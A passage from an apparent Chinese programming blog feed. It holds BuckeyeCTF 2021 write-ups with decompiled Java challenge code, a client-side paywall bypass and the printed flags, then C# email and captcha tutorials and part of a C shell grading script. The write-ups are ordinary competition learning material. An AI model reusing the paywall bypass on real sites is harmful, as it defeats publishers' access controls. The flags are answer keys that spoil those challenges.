                this.buttons[i][j] = new JButton(&quot;?&quot;);

                  if(this.grid[i][j] == 0) &#123;
                                  this.buttons[i][j].setText(&quot;\u2691&quot;);
                                &#125;

                this.buttons[i][j].addActionListener(this);
                this.buttons[i][j].setActionCommand(Integer.toString(j + i * this.cols));
                jPanel2.add(this.buttons[i][j]);
            &#125;
        &#125;
        this.buttons[this.endRow][this.endCol].setText(&quot;\u2691&quot;);
        jPanel2.setPreferredSize(new Dimension(45 * this.rows, 45 * this.cols));
        this.movesLabel = new JLabel(&quot;Moves left: 20&quot;);
        jPanel3.add(this.movesLabel);
        this.resetButton = new JButton(&quot;Reset&quot;);
        this.resetButton.addActionListener(this);
        this.resetButton.setActionCommand(&quot;reset&quot;);
        jPanel3.add(this.resetButton);
        jPanel.add(jPanel2);
        jPanel.add(jPanel3);
        this.resetGUI();
        this.getContentPane().add(jPanel);
        this.pack();
        this.setDefaultCloseOperation(3);
        this.setVisible(true);
    &#125;

    private void resetValues() &#123;
        this.posRow = 0;
        this.posCol = 1;
        this.moveHistory = new ArrayList();
        this.moveHistory.add(this.posCol + this.posRow * this.cols);
    &#125;

    private void updateMovesLeft() &#123;
        this.movesLabel.setText(&quot;Moves left: &quot; + Integer.toString(139 - this.moveHistory.size()));
    &#125;

    private void resetGUI() &#123;
        for (int i = 0; i &lt; this.rows; ++i) &#123;
            for (int j = 0; j &lt; this.cols; ++j) &#123;
                this.buttons[i][j].setEnabled(true);
            &#125;
        &#125;
        for (int j : this.moveHistory) &#123;
            int n = j / this.cols;
            int n2 = j % this.cols;
            this.buttons[n][n2].setEnabled(false);
        &#125;
        this.updateMovesLeft();
    &#125;

    private void reset() &#123;
        this.resetValues();
        this.resetGUI();
    &#125;

    private boolean isLegalMove(int n, int n2) &#123;
        if (139 - this.moveHistory.size() &lt;= 0) &#123;
            return false;
        &#125;
        return grid[n][n2] == 0 &amp;&amp; Math.abs(n - this.posRow) + Math.abs(n2 - this.posCol) == 1;
    &#125;

    private void printFlag() &#123;
        BigInteger bigInteger;
        BigInteger[] arrbigInteger = new BigInteger[this.moveHistory.size()];
        arrbigInteger[0] = BigInteger.valueOf(2L);
        for (int i = 1; i &lt; arrbigInteger.length; ++i) &#123;
            arrbigInteger[i] = arrbigInteger[i - 1].nextProbablePrime();
        &#125;
        BigInteger bigInteger2 = BigInteger.valueOf(1L);
        BigInteger bigInteger3 = new BigInteger(&quot;1430313837704837266267655033918654049072573502772041995300810633148485540425442305963378206448908414865491202671058946396326575688430628383447817933039379&quot;);
        for (int i = 0; i &lt; this.moveHistory.size(); ++i) &#123;
            bigInteger = BigInteger.valueOf(this.moveHistory.get(i).intValue());
            bigInteger2 = bigInteger2.multiply(arrbigInteger[i].modPow(bigInteger, bigInteger3)).mod(bigInteger3);
        &#125;
        BigInteger bigInteger4 = new BigInteger(&quot;1181624346478884506978387685027501257422054115549381320819711748725513305918055802813085700551988448885328987653245675378090761255233757606571908411691314&quot;);
        bigInteger = bigInteger4.multiply(bigInteger2).mod(bigInteger3);
        byte[] arrby = bigInteger.toByteArray();
        String string = new String(arrby, StandardCharsets.UTF_8);
        JOptionPane.showMessageDialog(this, &quot;Congrats! The flag is: &quot; + string, &quot;Flag&quot;, 1);
        System.out.println(string);
    &#125;

    @Override
    public void actionPerformed(ActionEvent actionEvent) &#123;
        String string = actionEvent.getActionCommand();
        if (string.equals(&quot;reset&quot;)) &#123;
            this.reset();
        &#125; else &#123;
            int n;
            int n2 = Integer.parseInt(string);
            int n3 = n2 / this.cols;
            if (this.isLegalMove(n3, n = n2 % this.cols)) &#123;
                this.buttons[n3][n].setEnabled(false);
                this.posRow = n3;
                this.posCol = n;
                this.moveHistory.add(n2);
                System.out.println(this.moveHistory);
                this.updateMovesLeft();
                if (this.posRow == this.endRow &amp;&amp; this.posCol == this.endCol) &#123;
                    this.printFlag();
                &#125;
            &#125; else &#123;
                JOptionPane.showMessageDialog(this, &quot;Illegal move, you lose \u2639&quot;, &quot;Illegal move&quot;, 0);
                this.reset();
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p><strong>flag:</strong><code>buckeye&#123;am4z1ng_j0b_y0u_b1g_j4va_h4ck3r&#125;</code></p>
<h1 id="pay2win"><a href="#pay2win" class="headerlink" title="pay2win"></a>pay2win</h1><p><em>Kyle started an online magazine (The Daily Kyle) and published one of my articles on his site. Don&#39;t worry, the article literally contains the flag in plaintext, but if you want to read it you&#39;ll have to figure out how to bypass the paywall.</em></p>
<p><em>URL: <a href="https://pay2win.chall.pwnoh.io/">https://pay2win.chall.pwnoh.io</a></em></p>
<hr>
<p>查看网页源代码,发现<code>plantFlag</code>函数,粘贴到Console中运行后,打印出<code>shwl_l1_twcd14&#125;1ry4ht3neck_t3_bs&#123;1c_hkh_tsh3he03gy_3l_hu</code>.</p>
<pre><code class="javascript">const ciphertext = [
    234, 240, 234, 252, 214, 236, 140, 247, 173, 191, 158, 132, 56, 4, 32, 73, 235, 193, 233, 152,
    125, 19, 19, 237, 186, 131, 98, 52, 186, 143, 127, 43, 226, 233, 126, 15, 225, 171, 85, 55,
    173, 123, 21, 147, 97, 21, 237, 11, 254, 129, 2, 131, 101, 63, 149, 61,
];
const plaintext = ciphertext.map((x, i) =&gt; (i * i) % 256 ^ x ^ 0x99);

const flagElement = document.querySelector(&quot;#flag&quot;);
plaintext.map((x, i) =&gt; &#123;
    const span = document.createElement(&quot;span&quot;);
    span.classList.add(`flag-char-$&#123;i&#125;`);
    span.textContent = String.fromCharCode(x);
    flagElement.appendChild(span);
    return span;
&#125;);
</code></pre>
<p>查看<code>main.css</code>,发现<code>span</code>都被设置了<code>order</code>属性.</p>
<p>我们可以把<code>main.css</code>,<code>main.js</code>和网页源代码<code>a.html</code>下载到本地.然后注释掉<code>main.js</code>里弹窗和阻止滚动的代码.</p>
<p>打开<code>a.html</code>,发现本应该显示<code>flag</code>的地方有一个灰色的框.</p>
<p>编辑<code>a.html</code>,将 <code>&lt;code id=&quot;flag&quot;&gt;&lt;/code&gt;</code>这一行代码移动至<code>&lt;pre&gt;</code>标签外面,即可看到<code>flag</code>.</p>
<p><img data-src="/../../CTF/BuckeyeCTF2021/Web/images/pay2win.jpg" alt="pay2win"></p>
<p><strong>flag:</strong><code>buckeye&#123;h0ly_sh1t_wh4t_th3_h3ck_1s_th1s_w31rd_ch4ll3ng3&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>BuckeyeCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>C#中使用SmtpClient发送邮件</title>
    <url>/posts/3123403799/</url>
    <content><![CDATA[<p>最近写C#课程设计时需要用C#来发送邮件，但是网上搜的代码经过测试均不能使用，调试了很久也没能成功。最后索性自己对着官方文档撸了一个，期间踩了很多坑，故在此做一总结。</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>命名空间导入:<code>using System.Net.Mail;</code></li>
<li>在邮箱设置中开通smtp服务，并获取授权码。<span id="more"></span></li>
</ul>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> mailfrom, password, fromwho, host, mailto, subject, body;</span><br><span class="line">mailfrom = <span class="string">&quot;xxx@qq.com&quot;</span>;<span class="comment">//发件人</span></span><br><span class="line"><span class="built_in">int</span> port = <span class="number">25</span>;<span class="comment">//端口号一般为25</span></span><br><span class="line">password = <span class="string">&quot;**********&quot;</span>;<span class="comment">//邮箱密码</span></span><br><span class="line">host = <span class="string">&quot;smtp.xxx.com&quot;</span>;<span class="comment">//主机地址</span></span><br><span class="line">fromwho = <span class="string">&quot;xxx&quot;</span>;<span class="comment">//发件人的签名</span></span><br><span class="line">mailto = <span class="string">&quot;xxx@qq.com&quot;</span>;<span class="comment">//收件人(多个收件人之间以英文逗号间隔)</span></span><br><span class="line">subject = <span class="string">&quot;test&quot;</span>;<span class="comment">//邮件主题</span></span><br><span class="line">body = <span class="string">&quot;xxxxx&quot;</span>;<span class="comment">//邮件正文</span></span><br><span class="line"></span><br><span class="line">SmtpClient smtp;</span><br><span class="line">smtp = <span class="keyword">new</span> SmtpClient(host, port);</span><br><span class="line">smtp.UseDefaultCredentials = <span class="literal">false</span>;</span><br><span class="line">smtp.EnableSsl = <span class="literal">true</span>;<span class="comment">//是否使用SSL加密连接</span></span><br><span class="line">smtp.DeliveryMethod = SmtpDeliveryMethod.Network;<span class="comment">//指定邮件发送方式</span></span><br><span class="line">smtp.Credentials = <span class="keyword">new</span> System.Net.NetworkCredential(mailfrom, password); <span class="comment">//设置用于验证发件人身份的凭证</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>[] address = mailto.Split(<span class="string">&#x27;,&#x27;</span>);<span class="comment">//收件人地址列表</span></span><br><span class="line">MailMessage msg = <span class="keyword">new</span> MailMessage();<span class="comment">//邮件信息</span></span><br><span class="line">msg.From = <span class="keyword">new</span> MailAddress(mailfrom, fromwho, Encoding.UTF8);</span><br><span class="line">msg.Subject = subject;<span class="comment">//邮件标题</span></span><br><span class="line">msg.SubjectEncoding = Encoding.UTF8;</span><br><span class="line">msg.Body = body;<span class="comment">//邮件正文</span></span><br><span class="line">msg.BodyEncoding = Encoding.UTF8;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; address.Length; i++)</span><br><span class="line">    msg.To.Add(address[i]);</span><br><span class="line"></span><br><span class="line">msg.Priority = MailPriority.Normal;<span class="comment">//邮件优先级(High,Low,Normal)</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    smtp.Send(msg);</span><br><span class="line">	Console.WriteLine(<span class="string">&quot;发送成功!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(e.Message);</span><br><span class="line">&#125;</span><br><span class="line">msg.Dispose();</span><br></pre></td></tr></table></figure>

<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul>
<li>代码中所使用的密码不是邮箱密码，应在邮箱设置中获取smtp服务授权码。</li>
<li>使用163邮箱时只能使用25端口(465&#x2F;994不可用),EnableSsl属性设置为false&#x2F;true</li>
<li>使用QQ邮箱发送时只能使用25端口(465&#x2F;587不可用),且EnableSsl属性必须设置为true</li>
<li>代码使用QQ邮箱、163邮箱实测有效，其他邮箱尚不清楚</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>无论是QQ邮箱还是163邮箱，使用SSL端口发送时均出现异常：操作超时，查了好久，发现是因为:System.Net.Mail只支持显式SSL(Explicit SSL)，但是不支持隐式SSL(Implicit SSL)，QQ邮箱使用的应该是Implicit SSL。此问题似乎可以用<code>System.Web.Mail</code>或<code>Cdosys.dll</code>解决，但是还没有试过。<br>关于QQ邮箱使用25端口发送时，必须使用设置SSL为true的原因:服务器从不受保护的25端口响应请求，然后将连接抛到受保护的465端口.<br><strong>显式SSL</strong>通过25端口连接 - &gt; StartTLS（开始加密）- &gt;验证 - &gt;发送数据<br><strong>隐式SSL</strong>StartSSL（开始加密） - &gt; 连接 - &gt; 验证 - &gt;发送数据</p>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/andrewniu/article/details/52594318">C#发送邮件三种方法，Localhost，SMTP，SSL-SMTP</a><br><a href="https://blogs.msdn.microsoft.com/webdav_101/2008/06/02/system-net-mail-with-ssl-to-authenticate-against-port-465/">System.Net.Mail with SSL to authenticate against port 465</a><br><a href="https://support.microsoft.com/en-us/help/950260/you-cannot-use-system-net-mail-smtpclient-to-send-an-e-mail-message-wi">You cannot use System.Net.Mail.SmtpClient to send an e-mail message with Implicit SSL</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>C#</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>C#中自己生成验证码</title>
    <url>/posts/1000607951/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近写C#课程设计时，登录验证处需用到验证码，于是参照网上博客，自己封装了一个验证码类，和网上其他博客相比，有以下优点:</p>
<ul>
<li>去除了0,o,O与1,l等容易混淆的字符</li>
<li>使用方便，仅需三行代码</li>
<li>内置有返回MD5加密后的字符串的方法，便于前端调用<span id="more"></span></li>
</ul>
<h2 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h2><h3 id="公有方法"><a href="#公有方法" class="headerlink" title="公有方法"></a>公有方法</h3><ul>
<li>SecurityCode(int length);&#x2F;&#x2F;构造函数</li>
<li>SecurityCode(int length, int width, int height);&#x2F;&#x2F;构造函数</li>
<li>void UpdateVerifyCode();&#x2F;&#x2F;刷新验证码</li>
<li>Bitmap getImage();&#x2F;&#x2F;返回验证码图片</li>
<li>string MD5Encrypt();&#x2F;&#x2F;返回经MD5加密过的验证码字符串</li>
<li>bool Check(string text);&#x2F;&#x2F;返回校验结果(不区分大小写)</li>
</ul>
<h3 id="私有方法"><a href="#私有方法" class="headerlink" title="私有方法"></a>私有方法</h3><ul>
<li>void CreateVerificationText(int length);&#x2F;&#x2F;随机生成验证码字符串</li>
<li>void CreateImage();&#x2F;&#x2F;生成验证码图片</li>
<li>Color RandColor();&#x2F;&#x2F;生成随机颜色</li>
<li>Point RandPoint();&#x2F;&#x2F;生成随机点</li>
</ul>
<h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">SecurityCode Code=<span class="keyword">new</span> SecurityCode(<span class="number">4</span>);</span><br><span class="line">code.UpdateVerifyCode();</span><br><span class="line">picturebox.Image=code.getImage();</span><br></pre></td></tr></table></figure>
<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="/images/securitycode.jpg" alt="验证码"></p>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">SecurityCode</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">private</span> Random rand = <span class="keyword">new</span> Random();<span class="comment">//生成随机数</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> VerificationText = <span class="built_in">string</span>.Empty;<span class="comment">//验证码字符串</span></span><br><span class="line">        <span class="keyword">private</span> Bitmap map;<span class="comment">//验证码的位图</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> length;<span class="comment">//验证码的字符个数</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> width;<span class="comment">//验证码图片的宽度</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> height;<span class="comment">//验证码图片的高度</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">SecurityCode</span>(<span class="params"><span class="built_in">int</span> length, <span class="built_in">int</span> width, <span class="built_in">int</span> height</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.length = length;</span><br><span class="line">            <span class="keyword">this</span>.width = width;</span><br><span class="line">            <span class="keyword">this</span>.height = height;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">SecurityCode</span>(<span class="params"><span class="built_in">int</span> length</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.length = length;</span><br><span class="line">            <span class="keyword">this</span>.width = (length + <span class="number">1</span>) * <span class="number">25</span>;</span><br><span class="line">            <span class="keyword">this</span>.height = <span class="number">40</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//随机生成验证码字符串</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CreateVerificationText</span>(<span class="params"><span class="built_in">int</span> length</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            VerificationText = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="built_in">string</span> dictionary = <span class="string">&quot;ABCDEFGHIJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789&quot;</span>;<span class="comment">//去除O,o,0 ,l,1</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> index = rand.Next(<span class="number">0</span>, dictionary.Length);</span><br><span class="line">                VerificationText += dictionary[index].ToString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//刷新验证码</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">UpdateVerifyCode</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            CreateVerificationText(length);</span><br><span class="line">            CreateImage();</span><br><span class="line">            <span class="comment">//Console.WriteLine(MD5Encrypt(VerificationText));//Only for test</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//生成验证码图片</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CreateImage</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            map = <span class="keyword">new</span> Bitmap(width, height);</span><br><span class="line">            Graphics g = Graphics.FromImage(map);</span><br><span class="line">            Pen pen = <span class="keyword">new</span> Pen(Color.Black);</span><br><span class="line">            <span class="built_in">string</span>[] font = &#123; <span class="string">&quot;Verdana&quot;</span>, <span class="string">&quot;Microsoft Sans Serif&quot;</span>, <span class="string">&quot;Consolas&quot;</span>, <span class="string">&quot;Arial&quot;</span>, <span class="string">&quot;宋体&quot;</span> &#125;;</span><br><span class="line">            Font f = <span class="keyword">new</span> Font(<span class="string">&quot;Arial&quot;</span>, <span class="number">20</span>, FontStyle.Bold);</span><br><span class="line">            g.Clear(Color.White);</span><br><span class="line">            SolidBrush brush = <span class="keyword">new</span> SolidBrush(Color.White);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//绘制干扰线条</span></span><br><span class="line">            pen.Width = <span class="number">0.1F</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                pen.Color = RandColor();</span><br><span class="line">                g.DrawLine(pen, RandPoint(), RandPoint());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//绘制干扰点</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Point p = RandPoint();</span><br><span class="line">                map.SetPixel(p.X, p.Y, RandColor());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//绘制字符串</span></span><br><span class="line">            SizeF  StringSizeF = g.MeasureString(VerificationText, f);</span><br><span class="line">            PointF StartPoint = <span class="keyword">new</span> Point(<span class="number">0</span>, (height - (<span class="built_in">int</span>)StringSizeF.Height) / <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                brush.Color = RandColor();</span><br><span class="line">                <span class="built_in">int</span> index = rand.Next(<span class="number">5</span>);</span><br><span class="line">                f = <span class="keyword">new</span> Font(font[index], <span class="number">20</span>, FontStyle.Bold);</span><br><span class="line">                StartPoint.X += <span class="number">5</span>;</span><br><span class="line">                g.DrawString(VerificationText[i].ToString(), f, brush, StartPoint);</span><br><span class="line">                SizeF CharSizeF = g.MeasureString(VerificationText[i].ToString(), f);</span><br><span class="line">                StartPoint.X += CharSizeF.Width;</span><br><span class="line">            &#125;</span><br><span class="line">            g.Dispose();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//生成随机颜色</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> Color <span class="title">RandColor</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Color c = Color.FromArgb(rand.Next(<span class="number">1</span>, <span class="number">256</span>), rand.Next(<span class="number">1</span>, <span class="number">255</span>), rand.Next(<span class="number">1</span>, <span class="number">255</span>));</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//生成随机点</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> Point <span class="title">RandPoint</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">int</span> x = rand.Next(<span class="number">0</span>, map.Width);</span><br><span class="line">            <span class="built_in">int</span> y = rand.Next(<span class="number">0</span>, map.Height);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Point(x, y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回验证码图片</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Bitmap <span class="title">getImage</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回经MD5加密过的验证码字符串</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">MD5Encrypt</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Tool.MD5Encrypt(VerificationText);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回校验结果</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">Check</span>(<span class="params"><span class="built_in">string</span> text</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> text.ToUpper().Equals(VerificationText.ToUpper());<span class="comment">//不区分大小写</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>C#</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言实现一个迷你Shell</title>
    <url>/posts/1118750159/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>俄勒冈州立大学（Oregon State University) CS 344作业,使用C语言实现一个Shell.</p>
<span id="more"></span>

<h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><ul>
<li>内置 <code>cd</code>,<code>status</code>和<code>exit</code> 命令</li>
<li>支持输入和输出的重定向</li>
<li>支持后台运行(&amp;)</li>
<li>Ctrl-Z 与 Ctrl-C</li>
<li>调用系统其他命令</li>
<li>替换命令中的<code>$$</code>为Shell的<code>PID</code></li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><h2 id="作业pdf"><a href="#作业pdf" class="headerlink" title="作业pdf"></a>作业pdf</h2><div class="pdf" target="./Program3.pdf" height=""></div>

<h2 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h2><figure class="highlight bash"><figcaption><span>p3testscript</span><a href="/downloads/code/p3testscript">view raw</a></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PRE-SCRIPT INFO&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  Grading Script PID: $$&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;  Note: your smallsh will report a different PID when evaluating $$&#x27;</span></span><br><span class="line"></span><br><span class="line">./smallsh &lt;&lt;<span class="string">&#x27;___EOF___&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> BEGINNING TEST SCRIPT</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> Using comment (5 points <span class="keyword">if</span> only next prompt is displayed next)</span><br><span class="line"><span class="comment">#THIS COMMENT SHOULD DO NOTHING</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">ls</span> (10 points <span class="keyword">for</span> returning <span class="built_in">dir</span> contents)</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">ls</span> out junk</span><br><span class="line"><span class="built_in">ls</span> &gt; junk</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">cat</span> junk (15 points <span class="keyword">for</span> correctly returning contents of junk)</span><br><span class="line"><span class="built_in">cat</span> junk</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">wc</span> <span class="keyword">in</span> junk (15 points <span class="keyword">for</span> returning correct numbers from <span class="built_in">wc</span>)</span><br><span class="line"><span class="built_in">wc</span> &lt; junk</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">wc</span> <span class="keyword">in</span> junk out junk2; <span class="built_in">cat</span> junk2 (10 points <span class="keyword">for</span> returning correct numbers from <span class="built_in">wc</span>)</span><br><span class="line"><span class="built_in">wc</span> &lt; junk &gt; junk2</span><br><span class="line"><span class="built_in">cat</span> junk2</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">test</span> -f badfile (10 points <span class="keyword">for</span> returning error value of 1, note extraneous &amp;)</span><br><span class="line"><span class="built_in">test</span> -f badfile</span><br><span class="line">status &amp;</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">wc</span> <span class="keyword">in</span> badfile (10 points <span class="keyword">for</span> returning text error)</span><br><span class="line"><span class="built_in">wc</span> &lt; badfile</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> badfile (10 points <span class="keyword">for</span> returning text error)</span><br><span class="line">badfile</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">sleep</span> 100 background (10 points <span class="keyword">for</span> returning process ID of sleeper)</span><br><span class="line"><span class="built_in">sleep</span> 100 &amp;</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> pkill -signal SIGTERM <span class="built_in">sleep</span> (10 points <span class="keyword">for</span> pid of killed process, 10 points <span class="keyword">for</span> signal)</span><br><span class="line"><span class="built_in">echo</span> (Ignore message about Operation Not Permitted)</span><br><span class="line">pkill <span class="built_in">sleep</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">sleep</span> 1 background (10 pts <span class="keyword">for</span> pid of <span class="built_in">bg</span> ps when <span class="keyword">done</span>, 10 <span class="keyword">for</span> <span class="built_in">exit</span> value)</span><br><span class="line"><span class="built_in">sleep</span> 1 &amp;</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">pwd</span> (10 points <span class="keyword">for</span> being <span class="keyword">in</span> the HOME <span class="built_in">dir</span>)</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span 